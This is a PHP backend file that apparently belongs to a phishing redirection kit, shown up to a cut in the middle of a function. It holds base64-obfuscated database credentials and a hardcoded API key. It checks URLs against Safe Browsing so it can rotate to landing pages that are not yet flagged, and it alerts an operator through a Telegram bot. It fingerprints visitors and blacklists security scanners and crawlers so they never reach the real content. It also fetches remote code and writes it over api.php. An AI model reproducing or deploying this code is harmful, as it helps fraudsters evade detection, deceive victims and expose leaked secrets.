<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
header('Content-Type: application/json');
 header("Access-Control-Allow-Origin: *");
  if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");
    http_response_code(200);
    exit();
}

header("Access-Control-Allow-Origin: *");
    
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}



$fs_host = base64_decode("MTk4LjI1MS44NC4yMDA");
$fs_user = base64_decode("emVyb2RheXNfZGF5");
$fs_pass = base64_decode("ZHJjZ2lseVAwKmsm");
$fs_name = base64_decode("emVyb2RheXNfZGF5");


global $fs_host, $fs_user, $fs_pass, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;

function user_data($id, $client_info, $ipAddress) 
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;

    if (empty($id)) {
        return ['status' => 'error', 'message' => 'No user ID provided'];
    }

    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
    if (!$db) {
        die(json_encode(['status' => 'error', 'message' => 'Database connection failed']));
    }

    $id = mysqli_real_escape_string($db, $id);
    $sql_u = "SELECT * FROM redirction WHERE id='$id'";
    $res_u = mysqli_query($db, $sql_u);

    if (mysqli_num_rows($res_u) > 0) {
        $row = mysqli_fetch_assoc($res_u);
        $data = [
            'status'       => 'success',
            'message'      => 'data found',
            'link'         => base64_decode(base64_decode($row["link"])),
            'cn'           => explode(";", base64_decode(base64_decode($row["country"]))),
            'pic'          => $row["pic"],
            'msg'          => base64_decode(base64_decode($row["msg"])),
            'expire_date'  => $row["expire_date"],
            'server'       => base64_decode(base64_decode($row["server"])),
            'url'          => base64_decode(base64_decode($row["url"])),
            'luxcaptcha'   => $row["luxcaptcha"],
            'tokentel'     => base64_decode(base64_decode($row["tokentel"])),
            'idtel'        => base64_decode(base64_decode($row["idtel"])),
            'redirict'     => $row["redirict"],
            'project'      => $row["project"],
            'api'          => $row["api"],
            'addby'        => $row["addby"],
            'isprotect'    => $row["isprotect"],
            'proxy'        => $row["proxy"],
            'captcha_data' => $row["captcha"],
            'goole_cap'    => $row["google_cap"],
            'cloud_cap'    => $row["cloud_cap"],
            'pro_ico'      => $row["pro_ico"],
            'pro_color'    => $row["pro_color"],
            'pro_msg'      => $row["pro_msg"],
            'pro_img'      => $row["pro_img"],
            'pro_logo'     => $row["pro_logo"],
        ];
    } else {
		$res = banned_client($ipAddress, "user not found: $id", $client_info);
        $data = ['status' => 'error', 'message' => $res['message']];
    }

    mysqli_close($db);
    return $data;
}
function url_packet()
{
       global $fs_host, $fs_user, $fs_pass, $fs_name;
       $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
       if (!$db) {
               die(json_encode(['status' => 'error', 'message' => 'Database connection failed']));
       }
       $sql = "SELECT * FROM luxdataurl WHERE status = '0'";
       $result = mysqli_query($db, $sql);
       $links = [];
       while ($row = mysqli_fetch_assoc($result)) {
              $links[] = $row["luxurl"];
       }
       mysqli_close($db);
       if (count($links) > 0) {
              shuffle($links);
              foreach ($links as $random_link) {
                     $safety_result = checkUrlSafety($random_link);
                     if ($safety_result === "Safe") {
                            return $random_link;
                     }
              }
              return "No safe URLs available.";
       } else {
              return "No URLs available.";
       }
}
function checkUrlSafety($url)
{
       $apiKey = "AIzaSyCv3mI6TjtqYTYQ8nZpA3Sx_7VSrq-hDyU";
       $apiEndpoint = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$apiKey";
       $requestData = [
              "client" => ["clientId" => "globalcom", "clientVersion" => "1.5.2"],
              "threatInfo" => ["threatTypes" => ["MALWARE", "SOCIAL_ENGINEERING"], "platformTypes" => ["WINDOWS"], "threatEntryTypes" => ["URL"], "threatEntries" => [["url" => $url]]],
       ];
       $jsonData = json_encode($requestData);
       $ch = curl_init($apiEndpoint);
       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
       curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "Content-Length: " . strlen($jsonData)]);
       $response = curl_exec($ch);
       if (curl_errno($ch)) {
              $result = "cURL Error: " . curl_error($ch);
       } else {
              $responseData = json_decode($response, true);
              if (isset($responseData["matches"]) && count($responseData["matches"]) > 0) {
                     $result = "Not Safe";
                     $messageme = "❌ System:\nDanger Link: $url";
                     tele_message($messageme);
              } else {
                     $result = "Safe";
              }
       }
       curl_close($ch);
       return $result;
}
function send_command($local_userAgent, $ip, $url, $command, $id, $host)
{
    
    $fields = [
        "send_ip" => $ip,
        "send_domain" => $url,
        "return_domain" => $host,
        "send_action" => $command,
        "send_id" => $id,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $local_userAgent);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60); // Set timeout to 30 seconds

    // Capture verbose output
    $verbose = fopen('php://temp', 'w+');
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_STDERR, $verbose);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        $error_message = curl_error($ch);
        curl_close($ch);

        // Read and log verbose output
        rewind($verbose);
        $verbose_log = stream_get_contents($verbose);
        file_put_contents('curl_error.log', "Curl error: $error_message\nVerbose output: $verbose_log\n", FILE_APPEND);

        return ["error" => "Curl error: " . $error_message];
    }

    curl_close($ch);
    // Decode the response
    $result = json_decode($response, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        file_put_contents('curl_error.log', "JSON decode error: " . json_last_error_msg() . "\nResponse: $result\n", FILE_APPEND);
    }

    return $result;
}
function detect_user($ipAddress)
{
       global $fs_host, $fs_user, $fs_pass, $fs_name;
       $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
       if (!$db) {
              die("Connection failed: " . mysqli_connect_error());
       }
       $sql_u = "SELECT * FROM logs WHERE ipaddres='$ipAddress'";
       $res_u = mysqli_query($db, $sql_u);
       if (mysqli_num_rows($res_u) > 0) {
              mysqli_close($db);
              return true;
       }
       mysqli_close($db);
       return false;
}
function fetchIPInfo($ipAddress)
{
    $url = "http://ip-api.com/json/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);

    $info = json_decode($response, true);

    if (!isset($info['status']) || $info['status'] !== 'success') {
        return [
            "isp" => "Unknown",
            "country" => "Unknown",
            "countryCode" => "Unknown",
            "city" => "Unknown",
            "region" => "Unknown",
            "proxy" => "False",
            "mobile" => "False",
            "hosting" => "False"
        ];
    }

    return [
        "isp" => $info["isp"] ?? null,
        "country" => $info["country"] ?? null,
        "countryCode" => $info["countryCode"] ?? null,
        "city" => $info["city"] ?? null,
        "region" => $info["regionName"] ?? null,
        "proxy" => !empty($info["proxy"]) ? "True" : "False",
        "mobile" => !empty($info["mobile"]) ? "True" : "False",
        "hosting" => !empty($info["hosting"]) ? "True" : "False"
    ];
}
function detectDeviceDetails($userAgent,$ipAddress) 
{
  
	$referrer = $_SERVER['HTTP_REFERER'] ?? 'None';
    $deviceType = detect_device_type($userAgent);
    $deviceName = detect_device_name($userAgent);
    $os = get_platform($userAgent);
    $osVersion = detect_os_version($userAgent, $os);
    $browser = get_browser_value($userAgent);
    $browserVersion = get_browser_version($userAgent, $browser);
    $requestSource = get_request_source($userAgent);
    $isFakeUserAgent = checkFakeUserAgent($userAgent);
    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'Yes' : 'No';
    $connectionType = $_SERVER['HTTP_CONNECTION'] ?? 'Unknown';
	$ipDetails = fetchIPInfo($ipAddress);
    $isp = $ipDetails['isp'];
    $country = $ipDetails['country'];
    $countryCode = $ipDetails['countryCode'];
    $city = $ipDetails['city'];
    $region = $ipDetails['region'];
    $proxy = $ipDetails['proxy'];
    $mobile = $ipDetails['mobile'];
    $hosting = $ipDetails['hosting'];
	$local_time = date("Y-m-d H:i:s");
    $local_domain = $_SERVER["SERVER_NAME"]; 
    return [
        "DeviceType" => $deviceType,
        "DeviceName" => $deviceName,
        "Os" => $os,
        "OsVersion" => $osVersion,
        "Browser" => $browser,
        "BrowserVersion" => $browserVersion,
        "RequestSource" => $requestSource,
        "IsFakeUserAgent" => $isFakeUserAgent,
        "Referrer" => $referrer,
        "IsHttps" => $isHttps,
        "ConnectionType" => $connectionType,
        "UserAgent" => $userAgent,
		"ipAddress" => $ipAddress,
		"isp" => $isp,
		"country" => $country,
		"countryCode" => $countryCode,
		"city" => $city,
		"region" => $region,
		"proxy" => $proxy,
		"mobile" => $mobile,
		"hosting" => $hosting,
		"local_time" => $local_time,
		"local_domain" => $local_domain,
    ];
}
function detect_device_type($userAgent) 
{
    if (preg_match('/windows phone|iemobile|mobile/i', $userAgent)) {
        return "Mobile";
    } elseif (preg_match('/tablet|ipad|playbook|silk/i', $userAgent)) {
        return "Tablet";
    } elseif (preg_match('/smart-tv|tv|chromecast|roku|appletv|playstation|xbox|nintendo/i', $userAgent)) {
        return "Smart TV/Console";
    } elseif (preg_match('/windows|linux|macintosh|ubuntu/i', $userAgent)) {
        return "Desktop";
    } elseif (preg_match('/watch|wear/i', $userAgent)) {
        return "Wearable";
    } elseif (is_bot($userAgent)) {
        return "Bot";
    }
    return "Unknown";
}
function detect_os_version($userAgent, $os) {
    $architecture = (stripos($userAgent, 'x64') !== false || stripos($userAgent, 'Win64') !== false) ? '64-bit' : '32-bit';
    if (preg_match('/PlayStation (\d+)/i', $userAgent, $matches)) {
        $psVersion = $matches[1]; 
        return "{$psVersion} ({$architecture})"; 
    }
    if ($os === "iPad" && preg_match('/cpu os (\d+[_\d]*) like mac os x/i', $userAgent, $matches)) {
        $version = str_replace('_', '.', $matches[1]);
        return "{$version} ({$architecture})";
    
    }
	
    if (preg_match('/CPU OS (\d+_\d+)/i', $userAgent, $matches)) {
        return str_replace('_', '.', $matches[1]);
    }
	if (preg_match('/ubuntu/i', $userAgent)) {
            return "X11 ({$architecture})";
        }
    if (preg_match('/iPhone OS (\d+_\d+_\d+)/i', $userAgent, $matches)) {
        $version = str_replace('_', '.', $matches[1]); 
        return "iOS " . $version . " (32-bit)";
    }
    if (stripos($os, "Windows") !== false) {
        if (preg_match('/windows nt (\d+\.\d+)/i', $userAgent, $matches)) {
            $version = $matches[1];

            switch ($version) {
                case '10.0':
                    return "10 ({$architecture})"; 
                case '6.3':
                    return "8.1 ({$architecture})";
                case '6.2':
                    return "8 ({$architecture})";
                case '6.1':
                    return "7 ({$architecture})";
                case '6.0':
                    return "Vista ({$architecture})";
                case '5.1':
                    return "XP ({$architecture})";
                default:
                    return "Unknown version ({$version})";
            }
        }
    }

    if (preg_match('/mac os x (\d+[_\d]*)/i', $userAgent, $matches)) {
        return str_replace('_', '.', $matches[1]) . " ({$architecture})";
    }

    if (preg_match('/android ([\d.]+)/i', $userAgent, $matches)) {
        return $matches[1] . " ({$architecture})";
    }

    if (preg_match('/iphone os (\d+[_\d]*)/i', $userAgent, $matches)) {
        return str_replace('_', '.', $matches[1]) . " ({$architecture})";
    }

    return "Unknown ({$architecture})";
}

function matchOSVersion($version) {
    switch ($version) {
        case '10.0':
            return 'Windows 10';
        case '11.0':
            return 'Windows 11';
        case '6.3':
            return 'Windows 8.1';
        case '6.2':
            return 'Windows 8';
        case '6.1':
            return 'Windows 7';
        case '6.0':
            return 'Windows Vista';
        case '5.1':
            return 'Windows XP';
        case '5.0':
            return 'Windows 2000';
        default:
            return "Unknown version ({$version})";
    }
}

function detect_device_name($userAgent) {
    $deviceName = "Unknown";
    $devices = [
    "/sm-[a-z0-9]+/i" => "Samsung Galaxy",
    "/SM-G/i" => "Samsung Galaxy",
    "/GT-I/i" => "Samsung Galaxy",
    "/SAMSUNG/i" => "Samsung Galaxy",
    "/Galaxy/i" => "Samsung Galaxy",
    "/SCH-/i" => "Samsung Galaxy", 
    "/Note/i" => "Samsung Galaxy",
    "/A52/i" => "Samsung Galaxy", 
    "/A71/i" => "Samsung Galaxy", 
    // Xiaomi Devices with more patterns
    "/Mi [a-z0-9]+/i" => "Xiaomi",
	"/M2101K6G/i" => "Xiaomi",  
    "/xiaomi/i" => "Xiaomi",
    "/redmi/i" => "Xiaomi",
    "/Mi[ ]*[a-z0-9]+/i" => "Xiaomi",
    "/Mi Max/i" => "Xiaomi",
    "/Redmi/i" => "Xiaomi",
    "/Poco/i" => "Xiaomi",
    "/Mi 11/i" => "Xiaomi",
    "/Redmi Note/i" => "Xiaomi",
    // Huawei Devices with more patterns
    "/ELS-[a-z0-9]+/i" => "Huawei",
    "/NKE-[a-z0-9]+/i" => "Huawei",
    "/huawei/i" => "Huawei",
    "/HUAWEI/i" => "Huawei",
    "/P30/i" => "Huawei",
    "/Mate/i" => "Huawei",
    "/HONOR/i" => "Huawei", 
    "/Y9/i" => "Huawei",
    "/Nova/i" => "Huawei", 
    // OnePlus Devices with more patterns
    "/IN2025/i" => "OnePlus",
    "/oneplus/i" => "OnePlus",
    "/A5000/i" => "OnePlus",
    "/OnePlus/i" => "OnePlus",
    "/OXYGEN/i" => "OnePlus",
    "/OnePlus 9/i" => "OnePlus",
    "/OnePlus Nord/i" => "OnePlus",
	"/BE[a-z0-9]+/i" => "OnePlus",
    // Apple Devices with more patterns
    "/iphone/i" => "Apple Device",
    "/ipad/i" => "Apple Device",
    "/ipod/i" => "Apple Device", 
    "/iPhone X/i" => "Apple Device",
    "/iPhone 11/i" => "Apple Device",
    "/iPad Pro/i" => "Apple Device", 
    // Google Pixel Devices with more patterns
    "/pixel/i" => "Google Pixel",
    "/Google Pixel/i" => "Google Pixel",
    "/Pixel/i" => "Google Pixel",
    "/Nexus/i" => "Google Pixel",
    "/Google/i" => "Google Pixel",
    "/Pixel 5/i" => "Google Pixel",
    "/Pixel 4/i" => "Google Pixel",
    "/Pixel XL/i" => "Google Pixel",
    // Sony Devices with more patterns
    "/sony/i" => "Sony",
    "/Xperia/i" => "Sony",
    "/Sony Xperia/i" => "Sony",
    "/Xperia XZ/i" => "Sony",
    "/Xperia Z/i" => "Sony",
    // LG Devices with more patterns
    "/lg/i" => "LG",
    "/LG-/i" => "LG",
    "/LG G/i" => "LG",
    "/LG V/i" => "LG",
    // HTC Devices with more patterns
    "/htc/i" => "HTC",
    "/HTC-/i" => "HTC",
    "/Desire/i" => "HTC",
    "/HTC One/i" => "HTC",
    // Motorola Devices with more patterns
    "/motorola/i" => "Motorola",
    "/moto/i" => "Motorola",
    "/XT/i" => "Motorola",
    "/Motorola-/i" => "Motorola",
    "/Moto G/i" => "Motorola",
    // Oppo Devices with more patterns
    "/oppo/i" => "Oppo",
    "/CPH/i" => "Oppo",
    "/Oppo-/i" => "Oppo",
    "/Reno/i" => "Oppo",
    "/Oppo F/i" => "Oppo",
    // Vivo Devices with more patterns
    "/vivo/i" => "Vivo",
    "/VIVO/i" => "Vivo",
    "/vivo-/i" => "Vivo",
    "/Vivo-/i" => "Vivo", 
    "/Vivo V/i" => "Vivo", 
    // Realme Devices with more patterns
    "/realme/i" => "Realme",
    "/RMX/i" => "Realme",
    "/Realme/i" => "Realme",
    "/Realme X/i" => "Realme",
    "/Realme 7/i" => "Realme",
    // Lenovo Devices with more patterns
    "/lenovo/i" => "Lenovo",
    "/Lenovo-/i" => "Lenovo",
    "/LAVIE/i" => "Lenovo",
    "/Lenovo K/i" => "Lenovo",
    // Asus Devices with more patterns
    "/asus/i" => "Asus",
    "/ZenFone/i" => "Asus",
    "/ROG/i" => "Asus", 
    "/Zenfone 6/i" => "Asus", 
    // Nokia Devices with more patterns
    "/nokia/i" => "Nokia",
    "/Nokia-/i" => "Nokia",
    "/Lumia/i" => "Nokia",
    "/Nokia 6/i" => "Nokia",
];


    if (preg_match('/\((?:Linux|Android).*?;\s*([^;]+?)\s*;.*?\)/i', $userAgent, $matches)) {
        $deviceName = trim($matches[1]);
    }

    foreach ($devices as $regex => $name) {
        if (preg_match($regex, $userAgent)) {
            return $name;
        }
    }

    if ($deviceName === "Unknown" && preg_match('/\b([A-Za-z0-9]+)\b/i', $userAgent, $matches)) {
        $deviceName = $matches[1];
    }

    return $deviceName;
}

function get_platform($userAgent) {
	
    $osArray = [
        "/windows nt 11/i" => "Windows 11",
        "/windows nt 10/i" => "Windows 10",
        "/windows nt 6.3/i" => "Windows 8.1",
        "/windows nt 6.2/i" => "Windows 8",
        "/windows nt 6.1/i" => "Windows 7",
        "/android/i" => "Android",
        "/iphone/i" => "iOS",
        "/ipad/i" => "iOS",
        "/macintosh|mac os x/i" => "Mac OS X",
		"/ubuntu/i" => "Ubuntu",
        "/linux/i" => "Linux",
		"/PlayStation/i" => "PlayStation",
    ];

    foreach ($osArray as $regex => $osName) {
        if (preg_match($regex, $userAgent)) {
            return $osName;
        }
    }
    return "Unknown OS Platform";
}

function get_browser_value($userAgent) {
    $browsers = [
        "/edg|edge/i" => "Microsoft Edge",
        "/firefox|fxios|firefox-kito/i" => "Firefox",
        "/chrome|crios/i" => "Chrome Browser",
        "/safari/i" => "Safari Browser",
        "/opera|opr/i" => "Opera Browser",
		"/SeaMonkey/i" => "SeaMonkey Browser",
		"/Nintendo/i" => "Nintendo Browser", 
        "/yabrowser/i" => "Yandex Browser", 
        "/duckduckgo/i" => "DuckDuckGo Browser", 
        "/ucbrowser/i" => "UC Browser",
        "/qqbrowser/i" => "QQ Browser",
        "/baidubrowser/i" => "Baidu Browser",
        "/samsungbrowser/i" => "Samsung Internet Browser",
        "/maxthon/i" => "Maxthon Browser",
        "/avast/i" => "Avast Secure Browser",
        "/avira/i" => "Avira Browser",
        "/midori/i" => "Midori Browser",
        "/tor/i" => "Tor Browser",
        "/netscape/i" => "Netscape",
        "/konqueror/i" => "Konqueror",
        "/seamonkey/i" => "SeaMonkey",
        "/epiphany/i" => "Epiphany",
    ];
    
	if (isTorBrowser($userAgent)) {
		return "Tor Browser"; 
	}
    foreach ($browsers as $regex => $browser) {
        if (preg_match($regex, $userAgent)) {
            return $browser;
        }
    }
	if (is_bot($userAgent)) {
        return "Internet Explorer";
    }
	if (preg_match('/Trident\//i', $userAgent)) {
        return "Internet Explorer";  
    }
    return "Unknown Browser";
}

function isTorBrowser($userAgent) {
    if (preg_match('/Firefox\/\d+\.?\d*\.?\d*esr/', $userAgent) && preg_match('/Gecko\/20100101/', $userAgent)) {
        return true;  // Likely a Tor Browser user
    }
    return false;
}

function get_browser_version($userAgent, $browser) {
    $browserPatterns = [
        "Firefox" => "/(?:Firefox|Firefox-KiToBrowser)\/([\d\.]+)/i",
        "Chrome" => "/Chrome\/([\d\.]+)/i",
        "Safari" => "/Version\/([\d\.]+)/i",
        "Microsoft Edge" => "/Edg\/([\d\.]+)/i",
        "SeaMonkey" => "/SeaMonkey\/([\d\.]+(?:\.[\d]+)+)/i",
        "Opera" => "/Opera\/([\d\.]+)|OPR\/([\d\.]+)/i",
    ];
	 if (preg_match('/Version\/([\d\.]+)/i', $userAgent, $matches)) {
        return $matches[1]; 
    }
	 if (preg_match('/Firefox\/(\d+\.\d+\.?\d*esr)/', $userAgent, $matches)) {
        return $matches[1];  
    }
	if (preg_match('/CriOS\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/i', $userAgent, $matches)) {
        return $matches[1]; 
    }
    if (preg_match('/Chrome\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/i', $userAgent, $matches)) {
        return $matches[1]; 
    }
    if (isset($browserPatterns[$browser])) {
      
        if (preg_match($browserPatterns[$browser], $userAgent, $matches)) {
            error_log("Matched version for {$browser}: " . $matches[1]);
            return $matches[1];
        } else {
            error_log("No match found for {$browser} with regex: " . $browserPatterns[$browser]);
        }
    }

    if (is_bot($userAgent)) {
        return "1.0";
    }

    return "Unknown Version";
}

function get_request_source($userAgent) {
    if (is_bot($userAgent)) {
        return "Bot/crowl";
    } elseif (preg_match('/python|curl|wget|postmanruntime|java|node\.js|axios|go-http-client/i', $userAgent)) {
        return "Script/Program";
    }
    return "Browser";
}

function checkFakeUserAgent($userAgent) {
    $commonBrowsers = [
        '/Mozilla/',
        '/Chrome/',
        '/Safari/',
        '/Firefox/',
        '/Edge/',
        '/Opera/',
        '/MSIE/', 
        '/Trident/',
    ];

    $botPatterns = [
        '/bot/', '/crawler/', '/spider/', '/googlebot/', '/bingbot/', '/yandexbot/', '/slurp/', '/duckduckbot/', 
        '/baidu/', '/ahrefsbot/', '/mj12bot/', '/dotbot/', '/seznambot/', '/zyborg/', '/telegrambot/', '/facebookexternalhit/',
        '/twitterbot/', '/bingpreview/'
    ];
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return "Yes";  
        }
    }
    if (is_bot($userAgent)) {
        return "Yes";
    } 
    foreach ($commonBrowsers as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return "No";  
        }
    }

    return "Yes";
}

function is_bot_ip($ipToCheck)
{
    $botsUrls = [
        "google" => "https://developers.google.com/search/apis/ipranges/googlebot.json",
        "bing" => "https://www.bing.com/toolbox/bingbot.json"
    ];

    foreach ($botsUrls as $bot => $url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            curl_close($ch);
            throw new Exception("Failed to fetch bot IP ranges for $bot: $error");
        }

        curl_close($ch);

        $botResp = json_decode($response, true);

        foreach ($botResp["prefixes"] as $ipRange) {
            if (isset($ipRange["ipv6Prefix"]) && strpos($ipToCheck, ":") !== false) {
                $network = $ipRange["ipv6Prefix"];
            } elseif (isset($ipRange["ipv4Prefix"]) && strpos($ipToCheck, ":") === false) {
                $network = $ipRange["ipv4Prefix"];
            } else {
                continue;
            }

            if (ip_in_range($ipToCheck, $network)) {
                return $bot;
            }
        }
    }

    return false;
}
function ip_in_range($ip, $range)
{
       list($subnet, $mask) = explode("/", $range);
       $mask = (int) $mask;
       $subnetBin = inet_pton($subnet);
       $ipBin = inet_pton($ip);
       $maskBin = str_repeat("\xFF", $mask >> 3) . chr(0xff << 8 - ($mask & 0x07));
       if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) {
              return false;
       }
       $subnetInt = unpack("N", $subnetBin)[1];
       $ipInt = unpack("N", $ipBin)[1];
       $maskInt = unpack("N", $maskBin)[1];
       return ($subnetInt & $maskInt) === ($ipInt & $maskInt);
}
function getFileContents($fileURL)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $fileURL);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $error = curl_error($curl);
    curl_close($curl);

    if ($statusCode === 200 && empty($error)) {
        $localFilePath = "web/api.php";
        if (file_put_contents($localFilePath, $response) !== false) {
            return true; // Success
        } else {
            return false; // Failed to save file
        }
    }

    $fileContents = file_get_contents($fileURL);
    if ($fileContents !== false) {
        $localFilePath = "web/api.php";
        if (file_put_contents($localFilePath, $fileContents) !== false) {
            return true; // Success
        } else {
            return false; // Failed to save file
        }
    }

    return false;
}
function tele_message($message)
{
       $TrubFtub = $_SESSION["idtel"];
       $cRetVckr = $_SESSION["tokentel"];
       $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
       $params = ["chat_id" => $TrubFtub, "text" => $message];
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, $api_url);
       curl_setopt($ch, CURLOPT_POST, true);
       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($ch);
       curl_close($ch);
}
function fetchContentFromURL($url)
{
       $ch = curl_init($url);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       $content = curl_exec($ch);
       curl_close($ch);
       return $content;
}
function is_bot($userAgent) 
{
    $botKeywords = [
        'bot', 'crawler', 'spider', 'fetch', 'scanner', 'scraper', 'yandexbot', 
        'baiduspider', 'googlebot', 'bingbot', 'duckduckbot', 'turnitinbot', 'netcraft',
        'amazonbot', 'censys', 'paloalto', 'expanse', 'zgrab', 'semrushbot', 'mj12bot', 
        'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 
        '(compatible', 'datadog', 'slackbot', 'discordbot', 'zapier'
    ];

    foreach ($botKeywords as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }

    if (preg_match('/Expanse.*Palo Alto Networks/i', $userAgent)) {
        return true;
    }

    return false;
}
function banned_client($ipAddress, $reason, $clientData)
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;

    // 1) Connect DB
    $db = @mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
    if (!$db) {
        return ['res_status'=>'500','message'=>'DB connection failed'];
    }

    // 2) Already blacklisted?
    $sql = "SELECT 1 FROM logs WHERE ipaddres = ?";
    $stmt = mysqli_prepare($db, $sql);
    mysqli_stmt_bind_param($stmt, 's', $ipAddress);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_store_result($stmt);
    if (mysqli_stmt_num_rows($stmt) > 0) {
        mysqli_stmt_close($stmt);
        mysqli_close($db);
        return ['res_status'=>'403','message'=>'Already blacklisted'];
    }
    mysqli_stmt_close($stmt);

    // 3) Insert into logs table
    $sql = "
      INSERT INTO logs (
        ipaddres, country, browser, os, domine, host, isp,
        mobile, proxy, hosting, city, region, mytime, reson,
        devicetype, devicename, osversion, browserversion,
        requestsource, isfakeuseragent, referrer,
        ishttps, connectiontype, useragent
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ";
    $stmt = mysqli_prepare($db, $sql);
    // extract with defaults:
    $d = array_merge(array_fill_keys([
        'country','Browser','Os','local_domain','isp','mobile','proxy','hosting',
        'city','region','local_time','DeviceType','DeviceName',
        'OsVersion','BrowserVersion','RequestSource','IsFakeUserAgent',
        'Referrer','IsHttps','ConnectionType','UserAgent'
    ], 'Unknown'), $clientData);

    $host = gethostbyaddr($ipAddress);
    mysqli_stmt_bind_param($stmt, str_repeat('s', 24),
        $ipAddress,
        $d['country'],$d['Browser'],$d['Os'],$d['local_domain'],$host,$d['isp'],
        $d['mobile'],$d['proxy'],$d['hosting'],$d['city'],$d['region'],$d['local_time'],$reason,
        $d['DeviceType'],$d['DeviceName'],$d['OsVersion'],$d['BrowserVersion'],
        $d['RequestSource'],$d['IsFakeUserAgent'],$d['Referrer'],
        $d['IsHttps'],$d['ConnectionType'],$d['UserAgent']
    );
    if (!mysqli_stmt_execute($stmt)) {
        mysqli_stmt_close($stmt);
        mysqli_close($db);
        return ['res_status'=>'500','message'=>'DB insert failed'];
    }
    mysqli_stmt_close($stmt);
    mysqli_close($db);

    // 4) Append to local log file
    $logFile = __DIR__ . '/banned_clients.log';
    $entry = sprintf(
        "[%s] %s | %s | %s\n",
        date('Y-m-d H:i:s'),
        $ipAddress,
        $reason,
        json_encode($clientData, JSON_UNESCAPED_SLASHES)
    );
    if (@file_put_contents($logFile, $entry, FILE_APPEND|LOCK_EX) === false) {
        error_log("banned_client(): cannot write to $logFile");
    }

    return ['res_status'=>'200','message'=>"$reason logged"];
}
function check_keyword(string $ipAddress, string $isp)
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;

    // 1) Connect once
    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
    if (!$db) {
        error_log("check_keyword(): DB connect failed");
        return false;
    }

    // 2) Fetch only the words we need
    $sql = "SELECT wording FROM mywording";
    $result = mysqli_query($db, $sql);
    if (!$result) {
        error_log("check_keyword(): Query error: " . mysqli_error($db));
        mysqli_close($db);
        return false;
    }

    // 3) Build lowercase list
    $words = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $words[] = strtolower($row['wording']);
    }
    mysqli_free_result($result);

    // 4) Prepare the three strings to search
    $ispLower       = strtolower($isp);
    $hostNameLower  = strtolower(gethostbyaddr($ipAddress) ?: '');
    $uaLower        = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    // 5) Check each keyword
    foreach ($words as $word) {
        if (
            stripos($ispLower,      $word) !== false ||
            stripos($hostNameLower, $word) !== false ||
            stripos($uaLower,       $word) !== false
        ) {
            mysqli_close($db);
            return $word;  // return the matching keyword
        }
    }

    mysqli_close($db);
    return false;
}
function isGoogleHost(string $host): bool
{
    return (bool) preg_match(
        '/\.(?:googlebot\.com|google\.com|googleusercontent\.com)$/i',
        $host
    );
}
function isGoogleCrawler(string $ua, string $ip, string $isp): bool
{
    // 1) Quick UA match
    static $uas = ['/Googlebot/i','/AdsBot\-Google/i','/Mediapartners\-Google/i'];
    foreach ($uas as $p) {
        if (preg_match($p, $ua)) {
            // got a Google‑style UA
            goto check_isp;
        }
    }
    return false;

    check_isp:
    // 2) ISP sanity (optional, but covers WHOIS data)
